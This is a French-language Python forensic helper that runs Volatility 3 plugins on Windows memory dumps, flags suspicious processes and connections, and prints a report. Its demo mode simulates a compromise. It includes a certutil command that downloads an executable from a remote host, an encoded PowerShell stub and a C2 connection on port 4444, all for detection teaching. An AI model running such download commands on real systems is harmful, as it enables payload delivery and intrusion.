#!/usr/bin/env python3
"""
memory_analysis_helper.py — Assistant d'analyse mémoire avec Volatility 3
Auteur  : Joe Bichall (@joebat10)
Usage   : python memory_analysis_helper.py --image memory.raw --profile Win10x64
          python memory_analysis_helper.py --demo

Ce script automatise les plugins Volatility 3 les plus utiles en DFIR
et génère un rapport structuré des artefacts trouvés en mémoire.

Prérequis : pip install volatility3
            https://github.com/volatilityfoundation/volatility3
"""

import os
import sys
import json
import subprocess
import argparse
import shutil
from datetime import datetime
from pathlib import Path
from typing import List, Optional
from dataclasses import dataclass, asdict


# ─── PLUGINS VOLATILITY 3 UTILISÉS ───────────────────────────────────────────

VOL_PLUGINS = {
    # Processus
    "pslist":    ("windows.pslist.PsList",          "Liste des processus actifs",                  "T1057"),
    "pstree":    ("windows.pstree.PsTree",          "Arbre processus (parent-enfant)",             "T1057"),
    "psscan":    ("windows.psscan.PsScan",          "Scan EPROCESS — détecte rootkits",           "T1014"),
    "cmdline":   ("windows.cmdline.CmdLine",        "Lignes de commande de chaque processus",     "T1059"),
    "dlllist":   ("windows.dlllist.DllList",        "DLL chargées par processus",                 "T1574"),

    # Réseau
    "netstat":   ("windows.netstat.NetStat",        "Connexions réseau actives/fermées",          "T1049"),
    "netscan":   ("windows.netscan.NetScan",        "Scan objets réseau en mémoire",              "T1049"),

    # Credentials / Injection
    "hashdump":  ("windows.hashdump.Hashdump",      "Hash NTLM depuis SAM/SYSTEM",               "T1003.002"),
    "lsadump":   ("windows.lsadump.Lsadump",        "Secrets LSA (passwords services)",          "T1003.004"),
    "malfind":   ("windows.malfind.Malfind",        "Détecte injections/shellcode en mémoire",   "T1055"),
    "hollowing": ("windows.hollowing.Hollowing",    "Détecte process hollowing",                  "T1055.012"),

    # Persistance
    "registry.printkey": ("windows.registry.printkey.PrintKey",
                          "Affiche une clé de registre depuis le dump",                          "T1547"),
    "filescan":  ("windows.filescan.FileScan",      "Scan des objets fichiers en mémoire",       "T1005"),
    "dumpfiles": ("windows.dumpfiles.DumpFiles",    "Extrait des fichiers de la mémoire",        "T1005"),

    # Handles & tokens
    "handles":   ("windows.handles.Handles",        "Handles ouverts par processus",             "T1057"),
    "privileges":("windows.privileges.Privs",       "Privilèges actifs (SeDebugPrivilege...)",   "T1134"),
}

# Processus Windows légitimes connus
KNOWN_LEGIT_PROCESSES = {
    "System", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
    "services.exe", "lsass.exe", "svchost.exe", "explorer.exe",
    "spoolsv.exe", "taskhost.exe", "taskhostw.exe", "dwm.exe",
    "conhost.exe", "RuntimeBroker.exe", "SearchIndexer.exe",
    "MsMpEng.exe", "NisSrv.exe", "audiodg.exe",
}

# Règles de détection processuelles
PROCESS_ANOMALIES = [
    # (pattern, description, technique)
    ("lsass.exe", "PPID != wininit.exe", "T1003.001"),
    ("svchost.exe", "PPID != services.exe ou nom modifié (lsass32, svch0st)", "T1036.005"),
    ("explorer.exe", "Plusieurs instances ou PPID inhabituel", "T1036"),
    ("cmd.exe", "Parent = Word/Excel/Outlook = macro probable", "T1204.002"),
    ("powershell.exe", "Encodé (-enc) ou parent inhabituel", "T1059.001"),
]


# ─── STRUCTURES DE DONNÉES ────────────────────────────────────────────────────

@dataclass
class ProcessEntry:
    pid: int
    ppid: int
    name: str
    create_time: str
    cmd: str = ""
    suspicious: bool = False
    anomaly: str = ""
    mitre: str = ""

@dataclass
class NetworkEntry:
    pid: int
    process: str
    local_addr: str
    local_port: int
    remote_addr: str
    remote_port: int
    state: str
    created: str
    suspicious: bool = False

@dataclass
class MalfindEntry:
    pid: int
    process: str
    address: str
    vad_tag: str
    protection: str
    size: int
    disassembly: str = ""

@dataclass
class MemoryReport:
    image_path: str
    profile: str
    analysis_date: str
    processes: List[ProcessEntry]
    network: List[NetworkEntry]
    malfind: List[MalfindEntry]
    suspicious_count: int = 0
    findings_summary: List[str] = None


# ─── RUNNER VOLATILITY ────────────────────────────────────────────────────────

class VolatilityRunner:
    def __init__(self, image_path: str, vol_path: str = "vol"):
        self.image = image_path
        self.vol_path = vol_path
        self._check_volatility()

    def _check_volatility(self):
        if shutil.which(self.vol_path) or shutil.which("vol3") or shutil.which("python"):
            self.available = True
        else:
            self.available = False
            print("[!] Volatility 3 non trouvé. Installer : pip install volatility3")

    def run_plugin(self, plugin_key: str, extra_args: list = None) -> str:
        """Lance un plugin Volatility et retourne le résultat texte."""
        if not self.available:
            return ""
        plugin_name = VOL_PLUGINS.get(plugin_key, (plugin_key,))[0]
        cmd = [self.vol_path, "-f", self.image, plugin_name]
        if extra_args:
            cmd.extend(extra_args)
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.stdout
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout sur {plugin_name}")
            return ""
        except Exception as e:
            print(f"[!] Erreur plugin {plugin_name}: {e}")
            return ""

    def parse_pslist(self) -> List[ProcessEntry]:
        """Parse la sortie de windows.pslist."""
        output = self.run_plugin("pslist")
        processes = []
        for line in output.splitlines()[2:]:  # Skip header
            parts = line.split()
            if len(parts) >= 5:
                try:
                    p = ProcessEntry(
                        pid=int(parts[2]),
                        ppid=int(parts[3]),
                        name=parts[1],
                        create_time=" ".join(parts[5:7]) if len(parts) > 6 else "",
                    )
                    processes.append(p)
                except (ValueError, IndexError):
                    continue
        return processes

    def parse_netscan(self) -> List[NetworkEntry]:
        """Parse la sortie de windows.netscan."""
        output = self.run_plugin("netscan")
        connections = []
        for line in output.splitlines()[2:]:
            parts = line.split()
            if len(parts) >= 7:
                try:
                    local = parts[2].rsplit(":", 1)
                    remote = parts[3].rsplit(":", 1) if parts[3] != "*" else ["*", "0"]
                    connections.append(NetworkEntry(
                        pid=int(parts[0]) if parts[0].isdigit() else 0,
                        process=parts[6] if len(parts) > 6 else "",
                        local_addr=local[0] if local else "",
                        local_port=int(local[1]) if len(local) > 1 and local[1].isdigit() else 0,
                        remote_addr=remote[0] if remote else "",
                        remote_port=int(remote[1]) if len(remote) > 1 and remote[1].isdigit() else 0,
                        state=parts[4] if len(parts) > 4 else "",
                        created=parts[5] if len(parts) > 5 else "",
                    ))
                except (ValueError, IndexError):
                    continue
        return connections


# ─── ANALYSEUR DE PROCESSUS ──────────────────────────────────────────────────

class ProcessAnalyzer:

    SUSPICIOUS_PARENTS = {
        "cmd.exe":        ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "acrord32.exe"],
        "powershell.exe": ["winword.exe", "excel.exe", "powerpnt.exe", "wscript.exe", "cscript.exe"],
        "wscript.exe":    ["winword.exe", "excel.exe"],
        "mshta.exe":      ["winword.exe", "excel.exe", "svchost.exe"],
    }

    def analyze(self, processes: List[ProcessEntry]) -> List[ProcessEntry]:
        pid_to_proc = {p.pid: p for p in processes}
        flagged = []

        for proc in processes:
            parent = pid_to_proc.get(proc.ppid)
            parent_name = parent.name.lower() if parent else ""

            # Check: parent suspect pour ce processus
            suspicious_parents = self.SUSPICIOUS_PARENTS.get(proc.name.lower(), [])
            if parent_name in [x.lower() for x in suspicious_parents]:
                proc.suspicious = True
                proc.anomaly = f"Parent inhabituel: {parent_name} → {proc.name}"
                proc.mitre = "T1204.002"

            # Check: processus se faisant passer pour un processus système
            elif proc.name.lower() not in [x.lower() for x in KNOWN_LEGIT_PROCESSES]:
                if any(legit.replace(".exe", "") in proc.name.lower()
                       for legit in KNOWN_LEGIT_PROCESSES if ".exe" in legit):
                    proc.suspicious = True
                    proc.anomaly = f"Nom similaire à un processus système légitime"
                    proc.mitre = "T1036.005"

            if proc.suspicious:
                flagged.append(proc)

        return flagged

    def detect_doppelgangers(self, processes: List[ProcessEntry]) -> List[str]:
        """Détecte les processus qui ont le même nom mais sont potentiellement malveillants."""
        findings = []
        name_counts = {}
        for p in processes:
            name_counts[p.name.lower()] = name_counts.get(p.name.lower(), 0) + 1

        # Processus qui ne doivent exister qu'une seule fois
        SINGLE_INSTANCE = {"lsass.exe", "lsm.exe", "wininit.exe", "smss.exe"}
        for name, count in name_counts.items():
            if name in SINGLE_INSTANCE and count > 1:
                findings.append(f"⚠️  {name} apparaît {count} fois — Process Doppelgänging possible (T1055.013)")
        return findings


# ─── MODE DÉMONSTRATION ───────────────────────────────────────────────────────

def generate_demo_results() -> MemoryReport:
    """Génère un rapport de démo réaliste simulant une compromission."""
    processes = [
        ProcessEntry(4, 0, "System", "2024-03-15 07:30:00"),
        ProcessEntry(624, 4, "smss.exe", "2024-03-15 07:30:01"),
        ProcessEntry(832, 624, "wininit.exe", "2024-03-15 07:30:02"),
        ProcessEntry(856, 832, "lsass.exe", "2024-03-15 07:30:02"),
        ProcessEntry(1024, 832, "services.exe", "2024-03-15 07:30:02"),
        ProcessEntry(1280, 1024, "svchost.exe", "2024-03-15 07:30:03"),
        ProcessEntry(2048, 1280, "explorer.exe", "2024-03-15 07:35:00"),
        ProcessEntry(3124, 2048, "winword.exe", "2024-03-15 08:00:00"),
        # Processus suspects — lancés par Word (macro malveillante)
        ProcessEntry(3892, 3124, "cmd.exe", "2024-03-15 08:05:30",
                     cmd='cmd.exe /c certutil -urlcache -f http://192.168.1.200/d.exe C:\\Temp\\s.exe',
                     suspicious=True, anomaly="Parent Word → cmd.exe (macro probable)", mitre="T1204.002"),
        ProcessEntry(4012, 3892, "powershell.exe", "2024-03-15 08:06:00",
                     cmd="powershell -enc SQBFAFgA...",
                     suspicious=True, anomaly="PowerShell encodé depuis cmd.exe", mitre="T1059.001"),
        # Processus se faisant passer pour LSASS
        ProcessEntry(4096, 1024, "lsass32.exe", "2024-03-15 08:07:00",
                     suspicious=True, anomaly="Faux lsass — masquerade de processus système", mitre="T1036.005"),
    ]

    network = [
        NetworkEntry(1280, "svchost.exe", "0.0.0.0", 135, "*", 0, "LISTEN", ""),
        NetworkEntry(856, "lsass.exe", "0.0.0.0", 49664, "*", 0, "LISTEN", ""),
        # Connexion suspecte
        NetworkEntry(4012, "powershell.exe", "192.168.1.20", 50123,
                     "185.220.101.45", 4444, "ESTABLISHED", "2024-03-15 08:06:30",
                     suspicious=True),
        NetworkEntry(4096, "lsass32.exe", "192.168.1.20", 50456,
                     "185.220.101.45", 8080, "ESTABLISHED", "2024-03-15 08:07:15",
                     suspicious=True),
    ]

    malfind = [
        MalfindEntry(4012, "powershell.exe", "0x1b4f000000", "VadS", "PAGE_EXECUTE_READWRITE",
                     4096, "48 8b 05 .. .. .. .. 48 85 c0 74 .. 48 8b 40 08 c3  — shellcode pattern"),
        MalfindEntry(4096, "lsass32.exe", "0x220a000000", "VadS", "PAGE_EXECUTE_READWRITE",
                     8192, "60 e8 00 00 00 00 5b 81 eb .. .. 00 00  — possible reflective injection"),
    ]

    findings_summary = [
        "🔴 CRITIQUE : cmd.exe lancé par winword.exe — macro malveillante probable (T1204.002)",
        "🔴 CRITIQUE : Connexion C2 depuis powershell.exe → 185.220.101.45:4444 (T1071)",
        "🔴 CRITIQUE : lsass32.exe — faux processus lsass avec connexion C2 active (T1036.005)",
        "🔴 CRITIQUE : Injection mémoire PAGE_EXECUTE_READWRITE dans powershell.exe et lsass32.exe (T1055)",
        "🟠 HAUT    : PowerShell encodé Base64 (T1059.001)",
        "🟠 HAUT    : Tentative de téléchargement de payload via certutil (T1105)",
    ]

    return MemoryReport(
        image_path="memory_dump_WS-COMPTA-01_20240315.raw",
        profile="Windows 10 x64 19041",
        analysis_date=datetime.now().isoformat(),
        processes=processes,
        network=network,
        malfind=malfind,
        suspicious_count=len([p for p in processes if p.suspicious]) + len([n for n in network if n.suspicious]),
        findings_summary=findings_summary,
    )


def print_report(report: MemoryReport):
    print(f"""
╔══════════════════════════════════════════════════════════╗
║         RAPPORT D'ANALYSE MÉMOIRE — VOLATILITY 3        ║
╚══════════════════════════════════════════════════════════╝
  Image    : {report.image_path}
  Profil   : {report.profile}
  Analysé  : {report.analysis_date[:19]}
  Suspects : {report.suspicious_count} artefacts identifiés
""")

    print("━"*60)
    print("  🔍 RÉSUMÉ DES FINDINGS")
    print("━"*60)
    for f in (report.findings_summary or []):
        print(f"  {f}")

    print(f"\n━"*60)
    print("  💻 PROCESSUS SUSPECTS")
    print("━"*60)
    for p in report.processes:
        if p.suspicious:
            print(f"\n  PID {p.pid} ({p.name})")
            print(f"    PPID    : {p.ppid}")
            print(f"    Anomalie: {p.anomaly}")
            print(f"    MITRE   : {p.mitre}")
            if p.cmd:
                print(f"    Cmdline : {p.cmd[:100]}")

    print(f"\n━"*60)
    print("  🌐 CONNEXIONS RÉSEAU SUSPECTES")
    print("━"*60)
    for n in report.network:
        if n.suspicious:
            print(f"\n  {n.process} (PID {n.pid})")
            print(f"    {n.local_addr}:{n.local_port} → {n.remote_addr}:{n.remote_port} [{n.state}]")

    print(f"\n━"*60)
    print("  💉 INJECTIONS MÉMOIRE (Malfind)")
    print("━"*60)
    for m in report.malfind:
        print(f"\n  {m.process} (PID {m.pid}) @ {m.address}")
        print(f"    Protection : {m.protection}")
        print(f"    Taille     : {m.size} bytes")
        print(f"    Analyse    : {m.disassembly[:100]}")


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Assistant d'analyse mémoire Volatility 3 pour le DFIR",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples :
  python memory_analysis_helper.py --demo
  python memory_analysis_helper.py --image memory.raw --output rapport_mem.json
  python memory_analysis_helper.py --image dump.raw --plugin malfind
  python memory_analysis_helper.py --list-plugins
"""
    )
    parser.add_argument("--image",        help="Chemin vers le dump mémoire (.raw, .vmem)")
    parser.add_argument("--demo",         action="store_true", help="Mode démonstration")
    parser.add_argument("--plugin",       help="Lancer un plugin spécifique")
    parser.add_argument("--list-plugins", action="store_true", help="Lister les plugins disponibles")
    parser.add_argument("--output",       help="Fichier JSON de sortie")
    parser.add_argument("--vol-path",     default="vol", help="Chemin vers vol (défaut: vol)")
    args = parser.parse_args()

    if args.list_plugins:
        print("\n📋 Plugins Volatility 3 configurés :\n")
        print(f"  {'CLÉ':<15} {'PLUGIN':<45} {'DESCRIPTION'}")
        print(f"  {'─'*15} {'─'*45} {'─'*35}")
        for key, (plugin, desc, mitre) in VOL_PLUGINS.items():
            print(f"  {key:<15} {plugin:<45} {desc[:35]}")
        return

    if args.demo:
        report = generate_demo_results()
    elif args.image:
        runner = VolatilityRunner(args.image, args.vol_path)
        processes = runner.parse_pslist()
        network   = runner.parse_netscan()
        analyzer  = ProcessAnalyzer()
        suspicious_procs = analyzer.analyze(processes)
        report = MemoryReport(
            image_path=args.image,
            profile="Auto-detect",
            analysis_date=datetime.now().isoformat(),
            processes=processes,
            network=network,
            malfind=[],
            suspicious_count=len(suspicious_procs),
            findings_summary=analyzer.detect_doppelgangers(processes),
        )
    else:
        parser.print_help()
        return

    print_report(report)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(asdict(report), f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[✓] Rapport JSON → {args.output}")


if __name__ == "__main__":
    main()
